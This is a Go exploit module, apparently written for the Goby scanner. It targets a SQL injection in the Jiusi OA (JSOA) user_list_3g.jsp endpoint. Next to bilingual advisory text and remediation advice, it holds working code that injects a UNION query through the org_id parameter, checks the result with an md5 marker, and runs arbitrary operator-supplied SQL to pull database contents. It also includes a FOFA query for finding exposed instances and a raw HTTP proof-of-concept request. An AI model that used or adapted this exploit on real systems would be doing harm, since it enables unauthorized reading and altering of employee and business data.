package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JSOA user_list_3g.jsp file SQL Injection Vulnerability",
    "Description": "<p>JSOA is an office automation system developed by Jiusi Software. It is based on the Java language and J2EE standard, supports a variety of databases, middleware, operating systems and browsers, and is characterized by progressiveness, ease of use, ease of maintenance, openness, scalability, integration, security, high performance and functionality.</p><p>There is an SQL injection vulnerability in the user list 3g. JSP interface of the JSOA system. Attackers can enter malicious SQL code to break through the system's originally set access rules, and unauthorized access, modification, or deletion of various sensitive information in the database, including but not limited to employee personal information, core business data, etc.</p>",
    "Product": "Jiusi-OA",
    "Homepage": "http://www.jiusi.net/",
    "DisclosureDate": "2024-03-29",
    "PostTime": "2024-03-29",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"/jsoa/login.jsp\"",
    "GobyQuery": "body=\"/jsoa/login.jsp\"",
    "Level": "3",
    "Impact": "<p>There is an SQL injection vulnerability in the user list 3g. JSP interface of the JSOA system. Attackers can enter malicious SQL code to break through the system's originally set access rules, and unauthorized access, modification, or deletion of various sensitive information in the database, including but not limited to employee personal information, core business data, etc.</p>",
    "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.jiusi.net/\">http://www.jiusi.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select version()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "九思OA user_list_3g.jsp 文件 SQL 注入漏洞",
            "Product": "九思软件-OA",
            "Description": "<p>九思OA是一款由九思软件开发的办公自动化系统，它基于JAVA语言和J2EE标准，支持多种数据库、中间件、操作系统和浏览器，具有先进性、易用性、易维护性、开放性、扩展性、集成性、安全性、高性能和功能性等特点。</p><p>九思 OA 系统 user_list_3g.jsp 接口存在 SQL 注入漏洞，攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。</p>",
            "Recommendation": "<p>1、请联系厂商修复漏洞：<a href=\"http://www.jiusi.net/\">http://www.jiusi.net/</a> </p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>九思 OA 系统 user_list_3g.jsp 接口存在 SQL 注入漏洞，攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JSOA user_list_3g.jsp file SQL Injection Vulnerability",
            "Product": "Jiusi-OA",
            "Description": "<p>JSOA is an office automation system developed by Jiusi Software. It is based on the Java language and J2EE standard, supports a variety of databases, middleware, operating systems and browsers, and is characterized by progressiveness, ease of use, ease of maintenance, openness, scalability, integration, security, high performance and functionality.</p><p>There is an SQL injection vulnerability in the user list 3g. JSP interface of the JSOA system. Attackers can enter malicious SQL code to break through the system's originally set access rules, and unauthorized access, modification, or deletion of various sensitive information in the database, including but not limited to employee personal information, core business data, etc.</p>",
            "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.jiusi.net/\">http://www.jiusi.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is an SQL injection vulnerability in the user list 3g. JSP interface of the JSOA system. Attackers can enter malicious SQL code to break through the system's originally set access rules, and unauthorized access, modification, or deletion of various sensitive information in the database, including but not limited to employee personal information, core business data, etc.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10940"
}`

	executeSqlCommandPXZOWEDKASD := func(hostInfo *httpclient.FixUrl, sql string) (string, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/95851,(" + url.QueryEscape(sql) + ")%20%23")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		}
		results := regexp.MustCompile(`<option value="95851\$(.*?)" >`).FindStringSubmatch(resp.RawBody)
		if len(results) > 1 {
			return results[1], nil
		}
		return "", nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			responseBody, err := executeSqlCommandPXZOWEDKASD(hostInfo, "md5(968)")
			if err == nil && strings.Contains(responseBody, "8f468c873a32bb0619eae") {
				stepLogs.VulURL = hostInfo.FixedHostInfo + "/jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/95851,(select+543)%20%23"
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "sql" {
				sql := goutils.B2S(stepLogs.Params["sql"])
				responseBody, err := executeSqlCommandPXZOWEDKASD(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if len(responseBody) > 0 {
					expResult.Success = true
					expResult.Output = responseBody
				}
			} else if attackType == "sqlPoint" {
				responseBody, err := executeSqlCommandPXZOWEDKASD(expResult.HostInfo, "md5(968)")
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(responseBody, "8f468c873a32bb0619eae") {
					expResult.Success = true
					expResult.Output = `GET /jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/95851,%6d%64%35%28%39%36%38%29%20%23 HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
				}
			}
			return expResult
		},
	))
}
